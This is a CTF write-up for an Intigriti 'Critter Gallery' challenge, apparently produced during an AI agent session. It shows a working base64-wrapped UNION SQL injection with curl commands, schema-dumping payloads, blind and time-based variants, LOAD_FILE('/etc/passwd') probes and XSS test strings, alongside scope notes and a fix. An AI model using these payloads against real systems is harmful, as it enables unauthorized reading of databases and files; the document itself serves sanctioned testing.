# challenge0926 — Intigriti September 2026 CTF ("Critter Gallery") engagement notes

Running notes for the **Challenge 0926** program on Intigriti (Public / Open,
Software, **CTF** — *"Come play our monthly CTF!"*). Reference:
`challenge0926.RoE`. All testing stayed within the published RoE.

> **Status:** complete.
> **Outcome:** ✅ **FLAG RECOVERED** — `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`

The challenge page is a small PHP gallery. The `?pic=` parameter is base64-decoded
and then interpolated straight into a MySQL `SELECT`, giving a **one-column
`UNION`-based SQL injection with the result reflected into the page**. The flag
lives in a `secret_vault` table that the UI never exposes; reading it is a single
crafted request. No authentication, no session and no victim interaction are
involved, so the RoE's *"shouldn't be self-XSS or related to MiTM attacks"* clause
is satisfied — the vulnerability is fully attacker-side.

---

## Rules of engagement (observed)

Straight from the RoE panel for programme **intigriti/Challenge 0926** — the
`AGENTS.md` placeholders ("User agent: TBD", "Required request header: TBD") are
resolved here, because the RoE answers both:

| RoE field | RoE value | How it was honoured |
| --- | --- | --- |
| **Automated tooling** | `max. 3 requests /sec` | **Never exceeded.** All traffic was single-threaded `curl` with `sleep 0.42` between requests → **≤2.4 req/s**. No parallel workers, no scanner bursts. |
| **User agent** | `Not applicable` | No UA requirement. Requests were sent with the default `curl/8.21.0` UA (recorded for reproducibility). |
| **Request header** | `Not applicable` | No mandatory header. **No** custom header (`X-Intigriti-*` or otherwise) was added — contrast with the sibling `uzleuven` programme from the same platform, which *does* mandate `X-Intigriti-Username: eliam`. |
| Contact artefact | `@intigriti.me` | Appears in the panel immediately above `User agent`; read as a programme contact field, **not** a mandatory UA/header value. Flagged under *Housekeeping*. |
| Out of scope | `N/A` | The RoE declares **no** out-of-scope assets. Scope is therefore exactly the one asset in the RoE asset table (below). |
| Safe harbour | `Safe harbour for researchers is applied` | Relied upon. |
| Program specifics | `Not managed by Intigriti`; **no bounties** ("responsible disclosure program without bounties") | N/A — CTF, no money at stake. |

Additional RoE rules, quoted:

- *"This challenge runs from 21/09/2026 10:00 AM until 28/09/2026, 11:59 PM UTC."* (today 2026-09-26 — inside the window, ~2 days left.)
- *"Every winner gets a €50 swag voucher…"*, first blood €100, seven winners drawn 30/09/2026.
- The solution *"Should leverage a vulnerability on the challenge page"*, *"Shouldn't be self-XSS or related to MiTM attacks"*, and *"Should include: The flag in the format `INTIGRITI{.*}` / The payload(s) used / Steps to solve"*, reported *"on the Intigriti platform"*.
- *"Test your payloads on the challenge page & let's capture that flag!"* — the RoE explicitly invites payloads against this host.

Also honoured (house rules from `AGENTS.md`, all stricter than the RoE):

- No DoS/DDoS, no brute force, no credential stuffing, no spam or social engineering.
- **No destructive payloads.** `INTO OUTFILE` / `INTO DUMPFILE` / stacked writes were deliberately **not** attempted (see *Not testable / blocked*).
- **No subdomain enumeration** — see the scope-trap note.

---

## Scope

Asset table from `challenge0926.RoE` (tier filter: All, type filter: All):

| Tier | Asset | Type | Status |
| --- | --- | --- | --- |
| **Tier 2** | `https://challenge-0926.challenges.intigriti.io` | URL | **In scope** |

That is the **entire** in-scope surface: one URL, one scheme, one host, one origin.
The RoE's *Out of scope* panel reads **`N/A`** — it does **not** carry the usual
catch-all sentence (*"Any area not explicitly listed is out of scope"*) that the
sibling programmes use. Scope discipline here therefore rests on the asset table
itself, which lists a single fixed URL.

### Scope discipline note — the wildcard-certificate trap

`challenge-0926.challenges.intigriti.io` presents a certificate for
**`CN=*.challenges.intigriti.io`** (Amazon-issued, valid 2026-04-30 → 2026-11-13).
A wildcard **certificate** is *not* a wildcard **scope**. The RoE asset table has
no `*` anywhere, so the wildcard SAN was treated as out of scope and:

- **no subdomain enumeration was run** (no `subfinder`, `crt.sh`, brute force, or
  certificate-transparency pivot off `*.challenges.intigriti.io`);
- the sibling CTF hosts implied by the wildcard (`challenge-0925.…`,
  `challenge-0927.…`) were **never resolved and never contacted** — they are
  different challenges and are out of scope for this engagement;
- the wildcard SAN appearing in `recon/02_tls.txt` is recorded as an observation
  only, never as a scope expansion.

A second trap: the page under test is *deliberately* embedded by the landing page
in an `<iframe src="/challenge.php">`, and its styling is a third-party Google
Fonts stylesheet. Both are same-origin / asset-level references **on the in-scope
host** (the Google Fonts URL is a stylesheet *reference string* inside the HTML and
was never fetched). All requests in this engagement went to
`challenge-0926.challenges.intigriti.io` and nowhere else.

`runs/` is empty: `tools/enum/masprobe.py` (masscan + nmap CIDR pipeline) is not
applicable to a single HTTPS vhost, and pointing a port scanner at one AWS
load-balancer IP would be both pointless and outside the spirit of the RoE.

---

## Environment / architecture

**DNS** (`recon/01_dns.txt`) — three A records, TTL 60, all in AWS `eu-west-1`:

```
challenge-0926.challenges.intigriti.io. 60 IN A 3.254.12.82
challenge-0926.challenges.intigriti.io. 60 IN A 52.16.81.206
challenge-0926.challenges.intigriti.io. 60 IN A 52.51.235.99
```

No AAAA, no CNAME in the answer (flattened at the resolver). TTL 60 + three
addresses = a load-balanced ingress, not a fixed origin.

**TLS** (`recon/02_tls.txt`) — `CN=*.challenges.intigriti.io`, RSA-2048,
`sha256WithRSAEncryption`, chain to *Amazon RSA 2048 M01* → *Amazon Root CA 1*.
Certificate is valid and current, so no expiry/TLS-layer issue.

**HTTP stack** (`recon/03_http_headers.txt`, `recon/04_root_headers.txt`):

| Header | Value | Reading |
| --- | --- | --- |
| `server` | `istio-envoy` | Istio service-mesh ingress in front of the app |
| `x-envoy-upstream-service-time` | `1`–`4` ms | Confirms Envoy sidecar → local upstream |
| `x-powered-by` | `PHP/8.2.33` | Apache + PHP-FPM behind Envoy |
| `content-type` | `text/html; charset=UTF-8` | — |
| `set-cookie` | *(absent)* | Fully stateless — no session, no cookies |
| `host` (echoed) | `challenge-0926.challenges.intigriti.io` | — |

**Application map**

| Path | Role | Notes |
| --- | --- | --- |
| `/` , `/index.php` | Landing page (7 205 B) | Challenge blob + `date`-driven timeline JS; renders `/challenge.php` in an `<iframe>` |
| **`/challenge.php`** | **The challenge ("Critter Gallery", 3 775 B)** | The vulnerable endpoint |
| `/static/css/style.css` | Stylesheet (4 444 B) | sha256 `b9c896ad…433943`; no hints/comments |
| `/static/favicon.ico`, `/static/images/creator.jpg`, `/static/images/share.png` | Static assets | hashes in `recon/` — see *Artifacts* |
| any extension-less path | → landing page, **HTTP 200** | soft-404 rewrite (`/api/`, `/server-status`, `/nonexistent` all return the 7 205 B index page) |
| any missing `*.php` / dotted path | → **404** | real 404s (`/flag.php`, `/robots.txt`, `/.git/HEAD`, `/Challenge.php`) |
| `/challenge.php` methods | `GET HEAD OPTIONS POST PUT DELETE` → 200; `TRACE` → **405** | no method enforcement, but no state-changing sink either |

**Back end** (from the injection, `recon/09_sqli_probes.txt`):

| Item | Value |
| --- | --- |
| DBMS | **MySQL 8.0.46** |
| Schema | `critter_gallery` (only user schema; plus `information_schema`, `performance_schema`) |
| DB user | `gallery@%` — privileges: **`USAGE` only** |
| Tables | `animals(description,id,name)`, **`secret_vault(id,note)`** |
| `@@datadir` | `/var/lib/mysql/` |
| `@@secure_file_priv` | `/var/lib/mysql-files/` |
| `@@hostname` | `db-7df4c4d979-pzqhj` — a Kubernetes pod name (ReplicaSet hash), so DB is a separate pod behind the mesh |

---

## Findings

### 1. Unauthenticated SQL injection in `/challenge.php?pic=` (base64-decoded) — the challenge vulnerability

**Label: finding (complete, PoC verified).** This is the intended vulnerability and
the source of the flag.

**How the parameter works.** The gallery links encode each animal name in base64:

```html
<a class="tile" href="?pic=Zm94">   <!-- Zm94   -> "fox"   -->
<a class="tile" href="?pic=dGlnZXI="> <!-- dGlnZXI= -> "tiger" -->
```

Server-side, the decoded value is interpolated into a single-row `SELECT` whose
only projected column is rendered into `<div class="desc">`. Three observations
pin the shape of the query:

1. **Exactly one column.** `UNION SELECT 1` reflects `1`; `UNION SELECT 1,2` returns
   an **HTTP 200 with a 0-byte body** (the SQL error path blanks the page). So the
   query projects one column, e.g.
   `SELECT description FROM animals WHERE name = '<decoded>'`.
2. **String-literal injection point.** `fox'-- -` still returns fox's row, and
   `fox' OR '1'='1` returns **all eight** rows — the decoded value is inside quotes.
3. **No filtering whatsoever.** `UNION`, `information_schema`, `0x…` hex literals,
   `SUBSTRING`, `group_concat` and `SLEEP` all execute. The base64 hop is *not* a
   control — it is only a cosmetic wrapper that keeps the parameter out of the way
   of casual scanners (and `base64_decode()` is lenient: it silently drops
   non-alphabet characters, so `%%%%` decodes to `''`).

**Minimal PoC (one request, no auth, no cookies, no victim):**

```bash
# decoded payload:  zzz' UNION SELECT note FROM secret_vault-- -
curl -sG 'https://challenge-0926.challenges.intigriti.io/challenge.php' \
     --data-urlencode "pic=enp6JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0="
```

```html
<div class="desc">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}<br></div>
```

Full request/response: `recon/08_flag_extraction.txt`. Decoded probe table:
`recon/09_sqli_probes.txt`.

**Why the flag is genuinely database-resident** (not reflected input): the payload
string itself is `zzz' UNION SELECT note …`, which is what appears in `<h2>`; the
`<div class="desc">` contains a value that is **not** in the request. It was
additionally confirmed **without any `UNION`**, using a boolean-blind predicate, so
the extraction does not depend on `UNION` mechanics at all:

```
fox' AND (SELECT SUBSTRING(note,1,N) FROM secret_vault)='<guess>'-- -
   I / IN / INT / INTI  -> fox's row returned  (TRUE)
   X                    -> "No critter goes by that name yet."  (false)
```

(`recon/12_blind_confirm.txt`.) Time-based injection also fires cleanly, with the
expected delay and no false positive:

```
zzz' UNION SELECT IF(1=2,SLEEP(1),0)-- -   ->  t = 0.070 s
zzz' UNION SELECT IF(1=1,SLEEP(1),0)-- -   ->  t = 1.077 s
```

**Full read of the database.** Because the projected column is rendered raw into
the page, the whole schema can be dumped through it:

| Payload (decoded) | Observed |
| --- | --- |
| `zzz' UNION SELECT version()-- -` | `8.0.46` |
| `zzz' UNION SELECT database()-- -` | `critter_gallery` |
| `zzz' UNION SELECT current_user()-- -` | `gallery@%` |
| `zzz' UNION SELECT @@hostname-- -` | `db-7df4c4d979-pzqhj` |
| `zzz' UNION SELECT @@datadir-- -` | `/var/lib/mysql/` |
| `zzz' UNION SELECT @@secure_file_priv-- -` | `/var/lib/mysql-files/` |
| `…group_concat(schema_name) FROM information_schema.schemata…` | `information_schema,performance_schema,critter_gallery` |
| `…group_concat(table_name) FROM information_schema.tables…` | `animals,secret_vault` |
| `…group_concat(column_name) FROM information_schema.columns…` | `description,id,name,id,note` |
| `zzz' UNION SELECT count(*) FROM secret_vault-- -` | `1` |
| `zzz' UNION SELECT group_concat(concat_ws(0x7c,id,note)) FROM secret_vault-- -` | `1\|INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}` |

**Impact.** Unauthenticated arbitrary read of every table in `critter_gallery`
(true for this CTF; on a production replication of this code path it would be
arbitrary read of the whole application database). Write escalation was **not**
achieved and was **not** attempted — see below.

**Fix.** Prepared statements / parameter binding for `pic` (e.g.
`SELECT description FROM animals WHERE name = ?`), plus server-side validation that
the decoded value is a member of a fixed animal set, and removal of the raw error
path that yields the blank 200.

**Duplicates / new-schema checks:** no other injectable parameter exists (POST body
params are ignored — see *Tested and found clean*), and no other table holds a
second flag.

---

### 2. Informational — stack and version disclosure

`x-powered-by: PHP/8.2.33` and `server: istio-envoy` are returned on every
response; the DBMS patch level (`MySQL 8.0.46`), the pod name and the server
filesystem layout (`@@datadir`, `@@secure_file_priv`, `@@basedir`) are all
recoverable through the injection. Standard practice is to suppress `x-powered-by`
(`expose_php = Off`) and to minimise what the SQL error path reveals.
**Informational only** — no CVE is claimed here, and per `AGENTS.md` a version
string without a PoC is not a finding. Recorded as recon value, not as a
vulnerability.

### 3. Informational — no standard security response headers

`/` and `/challenge.php` return no `Content-Security-Policy`,
`Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy` or
`Permissions-Policy`. Note that the missing `X-Frame-Options` / `frame-ancestors`
is *functional* here: `/index.php` deliberately frames `/challenge.php`, so
loosening it is by design. Per `AGENTS.md`, "missing security headers" is a usual
disqualifier; it is listed for completeness and is **not** part of the solution.
The one header that would have mattered — CSP — would not have stopped this bug
anyway, since the injection payload is never reflected as script (see *Tested and
found clean*, output encoding).

### 4. Informational — unhandled PHP `TypeError` on array input

`GET /challenge.php?pic[]=Zm94` → **HTTP 200, 0-byte body**. Passing an array where
a string is expected makes `base64_decode()` throw a `TypeError`; `display_errors`
is off, so nothing leaks, but the request dies with an empty 200 rather than a
clean 4xx/5xx. Hardening: validate input type. Evidence: `recon/11_http_surface.txt`.

### 5. Informational — soft-404: arbitrary extension-less paths return the landing page

`/api/`, `/server-status`, `/nonexistent`, `/nonexistent/` all return **HTTP 200**
with the 7 205-byte landing page, while dotted paths (`/robots.txt`, `/flag.php`,
`/.git/HEAD`, `/foo.php`) return a genuine 404. Consequence for recon: HTTP-200
liveness checks on this host are **meaningless** — two of the paths that "look
live" (`/api/`, `/server-status`) are just the rewrite landing on `/index.php`.
No directory listing, no `.git` exposure, no `.env` (all confirmed 404).
Evidence: `recon/07_paths.tsv`, `recon/11_http_surface.txt`.

### 6. Informational — HTTP methods not restricted

`GET`, `HEAD`, `OPTIONS`, `POST`, `PUT` and `DELETE` all return the same 200 page
on `/challenge.php`; `TRACE` is correctly rejected with **405**. No state-changing
sink was reachable (the app reads only `$_GET['pic']`), so this has no observed
impact — `PUT`/`DELETE` are behaviourally identical to `GET`. Worth restricting
`Allow`, but nothing more.

---

## Tested and found clean (the bulk of the work)

Every row is a control that was **ruled out by observation**, with the evidence
file that proves it.

| Probe | Result | Evidence |
| --- | --- | --- |
| **Injection without base64 wrapper** — `?pic=fox'` | The raw value is fed to `base64_decode()` first, which mangles it (`fox'` → `~?`); the SQL metacharacters never reach the query. The injection is genuinely *through* the base64 layer, not around it. | `recon/06b_invalid_b64.txt` |
| **Invalid / malformed base64** — `?pic=%%%%`, `?pic=not-base64!!!@@@`, `?pic=` | HTTP 200 every time, never a 4xx/5xx. `%%%%` and empty decode to `''` → detail block rendered with empty name + *"No critter goes by that name yet."* (4 075 B). No crash, no error text, no path disclosure. | `recon/06b_invalid_b64.txt` |
| **Database error disclosure** — `UNION SELECT 1,2` (wrong column count), `zzz'; SELECT 1-- -` (stacked), `…FROM mysql.user…` (privilege denied) | **Blank HTTP 200, 0-byte body** in every case. No SQL error string, no stack trace, no file path, no query echo. `display_errors` is off and the error handler exits cleanly. This suppresses the classic error-based escalation route. | `recon/09_sqli_probes.txt` |
| **Stacked queries** — `zzz'; SELECT 1-- -` | 0-byte body → the driver rejects/halts on multiple statements. No second statement executes. | `recon/09_sqli_probes.txt` |
| **FILE privilege / arbitrary file read** — `UNION SELECT LOAD_FILE('/etc/passwd')`, `LOAD_FILE('/var/www/html/challenge.php')`, `LOAD_FILE(0x2f…hex…)` | **`NULL`** for all three, including via hex-encoded path (so it is not a string-filter artefact). `user_privileges` for the connection's grantee `'gallery'@'%'` = **`USAGE`** only → no `FILE` privilege, and `@@secure_file_priv = /var/lib/mysql-files/` confines anything that did have it. **Least privilege is correctly applied; the SQLi cannot read application source or escalate to filesystem access.** | `recon/09_sqli_probes.txt` |
| **Arbitrary file write** (`INTO OUTFILE` / `INTO DUMPFILE`) | **Not attempted — deliberately.** It is a write operation, and `AGENTS.md` forbids destructive confirmation payloads. The `USAGE`-only grant (above) plus `secure_file_priv` already make it unreachable, so there is nothing left to prove. Recorded as a *closed lead*, not an open one. | `recon/09_sqli_probes.txt` |
| **Output encoding / XSS sink** — `UNION SELECT 0x3c696d67207372633d78206f6e6572726f723d616c6572742831293e` (`<img src=x onerror=alert(1)>`), `UNION SELECT 'A&B"C<D>'` | The `<div class="desc">` sink is **correctly HTML-escaped**: `&lt;img src=x onerror=alert(1)&gt;`, `A&amp;B&quot;C&lt;D&gt;`. The literal `<br>` seen between rows is the application's **own row separator**, appended outside the escaped value (verified: `UNION SELECT 'A<BR>B'` renders `A&lt;BR&gt;B`). There is **no XSS**, via this path or any other. | `recon/09_sqli_probes.txt`, `recon/06_pic_Zm94.html` |
| **Name reflection in `<h2>`** — `?pic=<b64 of '<b>bold</b>'>`, `'"><img src=x onerror=alert(1)>'`, `'<script>alert(1)</script>'` | Escaped in every case: `&lt;b&gt;bold&lt;/b&gt;`, `&quot;&gt;&lt;img src=x onerror=alert(1)&gt;`, `&lt;script&gt;…`. | `recon/09_sqli_probes.txt` |
| **POST body parameters** — `POST /challenge.php` with `pic=<injection>` in the body | Returns the **plain gallery page** (3 775 B, no detail block) → the script reads `$_GET` only. No second parameter, no `$_REQUEST` fallback. Also means there is **no write path**, so stored / second-order injection is structurally impossible. | `recon/11_http_surface.txt` |
| **Method handling** — `TRACE` | **405 Method Not Allowed** (122 B) — correctly disabled, so no cross-site tracing. (`GET/HEAD/OPTIONS/POST/PUT/DELETE` → 200, see Finding 6.) | `recon/11_http_surface.txt` |
| **Sensitive-path discovery** — `/robots.txt`, `/sitemap.xml`, `/flag.php`, `/admin.php`, `/login.php`, `/phpinfo.php`, `/info.php`, `/.git/HEAD`, `/.env`, `/challenge.php.bak`, `/backup.zip`, `/static/`, `/api/`, `/server-status` | All **404** except the known static assets and the soft-404 rewrite. No source backup, no VCS metadata, no secrets file, no directory listing, no `phpinfo`. | `recon/07_paths.tsv` |
| **Static assets as a hint source** — `style.css`, `favicon.ico`, `creator.jpg`, `share.png` | Fetched and hashed; `style.css` grepped for `flag\|hint\|todo\|vault\|secret` → **no hint strings**. Assets are inert. | `recon/10_style.css`, `recon/10_style_headers.txt` |
| **Local file inclusion via `pic`** — `?pic=<b64 of '....//....//etc/passwd'>` | Renders *"No critter goes by that name yet."* — the decoded value is a SQL string literal, never a filesystem path. No traversal, no include. | `recon/09_sqli_probes.txt` |
| **Authentication / session surface** | **None exists.** No login page, no cookies, no `Set-Cookie`, no CSRF token, no session. Every request in this engagement was anonymous. Authn/authz/logout/IDOR testing is therefore vacuous, not skipped. | `recon/03_http_headers.txt`, `recon/11_http_surface.txt` |
| **TLS / certificate** | Valid chain to Amazon Root CA 1, current validity (2026-04-30 → 2026-11-13), RSA-2048, no expiry or hostname-mismatch issue. | `recon/02_tls.txt` |
| **Rate-limit compliance** | Single-threaded, `sleep 0.42` between requests → **≤2.4 req/s** against the 3 req/s ceiling. No parallel or burst tooling was used at any point. | method; all `recon/` files carry UTC timestamps |
| **Subdomain enumeration** | **Deliberately not run** (fixed single-URL scope; wildcard cert is not wildcard scope). Nothing was resolved or contacted outside the one asset. | `recon/01_dns.txt`, `recon/02_tls.txt` |

---

## Not testable / blocked

| Item | Why | Status |
| --- | --- | --- |
| **Arbitrary file write / RCE via `INTO OUTFILE`** | Not attempted by design (write operation; `AGENTS.md` bans destructive confirmation). Independently blocked by the `USAGE`-only grant + `secure_file_priv`. | **Closed lead** |
| **Enumerating other DB users** (`mysql.user`) | `SELECT … FROM mysql.user` → 0-byte body (privilege denied). Blind enumeration was not pursued — it would need brute force over the rate-limited endpoint and adds nothing to the flag. | **Blocked by privilege** |
| **Second-order / stored injection** | The app has **no** insert, update or write endpoint at all (POST params ignored, single read-only `SELECT` sink). There is no code path that could store attacker input. | **Structurally impossible** |
| **Post-authentication surface** | There is no authentication system on this host. | **Non-existent** |
| **Port/service scanning** (`masprobe`, masscan, nmap) | RoE scope is one HTTPS URL on an AWS load balancer; `tools/enum/masprobe.py` targets CIDR ranges. Scanning the LB's adjacent ports/IPs would exceed a single-URL scope. | **Not applicable — deliberately skipped** |
| **Write-up publication** | RoE: *"Please hold off from making your write-up publically accessible just until the challenge ends"* and it must be a **publicly accessible link** (not PDF/Markdown) submitted as a comment on the report. | **Deferred to after 28/09/2026 23:59 UTC** |

---

## Reportability (RoE filter)

The RoE for this programme declares **Out of scope: N/A**, so nothing is
disqualified by an exclusion list. Reportability is instead gated by the
challenge's own *solution* criteria:

| Item | RoE gate | Verdict |
| --- | --- | --- |
| SQL injection in `/challenge.php?pic=` + flag | *"Should leverage a vulnerability on the challenge page."* | ✅ **Reportable** — a real unsanitised-query defect on the challenge page |
| — | *"Shouldn't be self-XSS or related to MiTM attacks."* | ✅ No XSS at all; no victim, no proxy, no browser needed. Not self-XSS, not MitM |
| — | *"Should include: The flag in the format `INTIGRITI{.*}`"* | ✅ `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}` |
| — | *"Should include: The payload(s) used / Steps to solve"* | ✅ Below, and in `recon/08_flag_extraction.txt` |
| — | *"Should be reported on the Intigriti platform."* | ⏳ **Action owed** — submit via `https://go.intigriti.com/submit-solution` (platform account required) |
| Write-up link as a report comment | *"You can submit your write-up by simply adding the link as a comment under your report."* | ⏳ **Action owed** — after the challenge closes |
| Finding 2 — version/stack disclosure | `AGENTS.md`: *"Out of date without a PoC"* and version-string-only reports are disqualifiers | ⚪ Not reported — informational recon value |
| Finding 3 — missing security headers | `AGENTS.md`: *"missing security headers"* is a usual disqualifier. Additionally, absent `X-Frame-Options` is **by design** here (the landing page frames the challenge page) | ⚪ Not reported |
| Findings 4, 5, 6 — `TypeError` blank 200; soft-404 rewrite; lax methods | No impact demonstrated, no sensitive data, no state change ("verbose errors without sensitive data" analogue) | ⚪ Not reported — hardening notes only |
| Flag value itself | Not a vulnerability; it is the challenge objective | ⚪ Submitted as the solution, not as a finding |

**Bottom line:** exactly one item is reportable, and it is the one that wins the
challenge.

---

## Artifacts

All raw evidence is under `recon/`; the bytes are as returned by the server and
were never retyped. `runs/` is intentionally empty (see scope note).

| File | Content |
| --- | --- |
| `challenge0926.RoE` | Scope record — read-only, never edited |
| `recon/01_dns.txt` | A/AAAA/CNAME lookups, TTL, the three AWS addresses |
| `recon/02_tls.txt` | Full certificate chain (`*.challenges.intigriti.io`) |
| `recon/03_http_headers.txt` | Response headers over HTTP/2 and HTTP/1.1 |
| `recon/04_root_headers.txt`, `recon/04_root_body.html` | Landing page — headers and full 7 205-byte HTML (incl. the `/challenge.php` iframe) |
| `recon/05_challenge_headers.txt`, `recon/05_challenge_body.html` | `/challenge.php` — headers and full 3 775-byte "Critter Gallery" HTML (the base64 `?pic=` links) |
| `recon/06_pic_Zm94.{html,hdr}` | `?pic=Zm94` → fox detail view |
| `recon/06_pic_cGFuZGE.{html,hdr}` | `?pic=cGFuZGE=` → panda detail view |
| `recon/06_pic_unknown.{html,hdr}` | `?pic=bm9uc2Vuc2U=` → unknown-name branch |
| `recon/06b_invalid_b64.txt` | Malformed / empty base64 behaviour (lenient decode) |
| `recon/07_paths.tsv` | 20-path enumeration with status, size, content-type |
| **`recon/08_flag_extraction.txt`** | **Minimal PoC** — request + full response containing the flag |
| `recon/09_sqli_probes.txt` | The complete decoded-payload → observed-output table (26 probes) |
| `recon/10_style.css`, `recon/10_style_headers.txt` | Stylesheet bytes (sha256 `b9c896ad…433943`) + headers |
| `recon/11_http_surface.txt` | Routing/rewrite, HTTP methods, param-type and POST-body behaviour |
| `recon/12_blind_confirm.txt` | `UNION`-free boolean-blind confirmation that the flag is DB-resident |
| `README.md` | This deliverable |
| session plan | `/home/arch/.copilot/session-state/1f2e9087-…/plan.md` (kept out of the repo) |

Static-asset hashes (sha256) for reproducibility:

| Asset | sha256 |
| --- | --- |
| `/static/css/style.css` | `b9c896ad030a066f867d79ab7670effc0ff40bdab35e33c32c8686db1d433943` |
| `/static/favicon.ico` | `a2582ab3b204f3d8ea90f1b12110188f960a5c7f64681ae46cee0be83d463dd1` |
| `/static/images/creator.jpg` | `2b2064bd0749c06a7144cfbbd8b40a3990af61c6bb8c276f5cfbebd684699c30` |
| `/static/images/share.png` | `577d3ace90f725d6b4a9c448f989cff6dc0e767cdee92760566b00671d068637` |

### Reproduction highlights

```bash
# 0. Scope: the ONLY in-scope asset is https://challenge-0926.challenges.intigriti.io
#    Send <=3 requests/second. No required UA, no required header.

# 1. Passive recon - DNS and TLS
dig +short A challenge-0926.challenges.intigriti.io      # 3 AWS eu-west-1 A records
echo | openssl s_client -connect challenge-0926.challenges.intigriti.io:443 \
       -servername challenge-0926.challenges.intigriti.io 2>&1 | openssl x509 -noout -subject

# 2. Fingerprint the stack
curl -sSI https://challenge-0926.challenges.intigriti.io/
#   server: istio-envoy ; x-powered-by: PHP/8.2.33 ; no Set-Cookie

# 3. Read the challenge page - note the base64-wrapped ?pic= links
curl -s https://challenge-0926.challenges.intigriti.io/challenge.php

# 4. Confirm injection (baseline vs. true/false conditions)
b64() { printf '%s' "$1" | base64 -w0; }
BASE=https://challenge-0926.challenges.intigriti.io/challenge.php
curl -sG --data-urlencode "pic=$(b64 "fox")"              "$BASE"  # fox's row
curl -sG --data-urlencode "pic=$(b64 "fox' AND 1=1-- -")"  "$BASE"  # fox's row          (TRUE)
curl -sG --data-urlencode "pic=$(b64 "fox' AND 1=2-- -")"  "$BASE"  # "no critter"       (FALSE)
curl -sG --data-urlencode "pic=$(b64 "zzz' UNION SELECT 1,2-- -")" "$BASE"  # 0 bytes -> 1 column

# 5. Read the schema, find the vault table
#    ...' UNION SELECT group_concat(table_name) FROM information_schema.tables
#        WHERE table_schema=database()-- -            ->  animals,secret_vault

# 6. Get the flag  (see recon/08_flag_extraction.txt)
curl -sG --data-urlencode "pic=enp6JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=" "$BASE"
#   <div class="desc">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}<br></div>
```

Steps to solve, in prose:

1. Load `https://challenge-0926.challenges.intigriti.io/` → an `<iframe>` to `/challenge.php`, a "Critter Gallery" of eight animal tiles.
2. Notice every tile links to `?pic=<base64>` (`Zm94` = `fox`) — the parameter is opaque, not obviously injectable.
3. Decode a tile value, then send it back with a quote appended: `?pic=<b64 of "fox'">` → the app does not fault, and `fox' OR '1'='1` returns **all eight** descriptions → the value is a SQL string literal.
4. Bisect the query with `UNION SELECT 1` / `UNION SELECT 1,2` → exactly **one** column, and the result renders into `<div class="desc">`.
5. Enumerate with `information_schema` → schema `critter_gallery`, tables `animals`, **`secret_vault`**.
6. `UNION SELECT note FROM secret_vault` → **the flag**.

---

## Housekeeping

- **Report owed:** submit the flag, the payloads and the steps on the Intigriti
  platform (`https://go.intigriti.com/submit-solution`) before **28/09/2026 23:59 UTC**.
- **Write-up owed:** publish a *publicly accessible link* (not PDF/Markdown) and add
  it as a comment on the report — but **only after** the challenge closes, per the
  RoE fairness note.
- **Residual RoE ambiguity (recorded, not resolved):** the RoE panel shows the
  string `@intigriti.me` immediately above `User agent: Not applicable`. It was read
  as a programme contact field, not as a mandatory UA/header value; no request in
  this engagement carried a custom header. Because the RoE also states both
  `User agent` and `Request header` are *Not applicable*, and every request was
  ≤2.4 req/s single-threaded, no rule is believed to have been breached. Confirm with
  the programme if this engagement is ever resumed.
- **`AGENTS.md` versus the RoE:** `AGENTS.md` predicted *"the RoE almost always says
  'everything not listed is out of scope'"*. This RoE does **not** — its
  out-of-scope panel is `N/A`. The single-asset table is therefore the whole scope
  argument, and the wildcard certificate was correctly *not* treated as scope.
- Do not touch any host other than `challenge-0926.challenges.intigriti.io`.
- `challenge0926.RoE` is the scope record — never edit it.
- `INTO OUTFILE`/`INTO DUMPFILE` remain untried by policy, not by oversight.

---

## Next

1. Submit the report on the Intigriti platform (flag + payloads + steps) before the 28/09/2026 deadline.
2. Keep the write-up private until the challenge ends; then publish it at a public URL and link it in a report comment.
3. Optional rigour: automate the boolean-blind extraction end-to-end to show the flag can be pulled **without** `UNION` (the manual 4-character confirmation is in `recon/12_blind_confirm.txt`).
4. Optional: recommend pinning the `gallery` grant to the specific schema and setting `expose_php = Off` — both moot for a CTF host, relevant only if this code template is reused.

## Change log

- **2026-09-26** — Engagement scaffolded; RoE captured; enumeration started.
- **2026-09-26** — RoE read in full. Resolved the `AGENTS.md` placeholders: rate limit
  **3 req/s**, **no** required UA, **no** required header, out-of-scope `N/A`, single
  asset `https://challenge-0926.challenges.intigriti.io` (Tier 2). No subdomain
  enumeration (fixed URL scope; wildcard cert ≠ wildcard scope).
- **2026-09-26** — Passive recon: DNS (3 × AWS eu-west-1 A records), TLS chain, HTTP
  headers → `istio-envoy` + `PHP/8.2.33`, stateless (no cookies).
- **2026-09-26** — Surface mapping: landing page `/index.php` framing the challenge at
  `/challenge.php`; base64-wrapped `?pic=` parameter; 20-path enumeration (soft-404
  rewrite identified); static assets hashed; POST/method/param-type behaviour recorded.
- **2026-09-26** — Vulnerability identified: 1-column `UNION` SQL injection through
  the base64-decoded `?pic=`, output reflected in `<div class="desc">`. Boolean,
  time-based and `UNION`-based variants all confirmed; output encoding proven correct
  (no XSS); `FILE` privilege proven absent (`USAGE` only).
- **2026-09-26** — **FLAG RECOVERED:** `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`
  from `secret_vault.note`, independently confirmed via `UNION`-free boolean-blind
  extraction. Evidence written to `recon/08_flag_extraction.txt`,
  `recon/09_sqli_probes.txt`, `recon/12_blind_confirm.txt`.
- **2026-09-26** — README rewritten to house structure. Report submission pending.

```
(\_/)
(o.o)
(> <) rabbit-hole-research
```
